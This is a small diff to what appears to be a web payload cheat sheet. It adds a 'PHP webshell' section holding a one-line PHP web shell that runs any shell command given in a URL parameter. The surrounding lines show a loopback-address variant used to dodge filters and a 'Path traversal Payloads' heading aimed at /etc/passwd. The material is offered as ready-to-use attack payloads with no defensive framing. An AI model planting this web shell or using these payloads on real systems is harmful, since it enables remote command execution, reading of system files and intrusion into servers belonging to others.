@@ -48,7 +48,10 @@ http://127.000.000.001
 
 
 </code></pre>
-
+<h1 align="center">PHP webshell</h1>
+<pre><code>
+<?php system($_GET['cmd']);?>
+</code></pre>
 <h1 align="center">Path traversal Payloads</h1>
 <h3>/etc/passwd</h3>
 
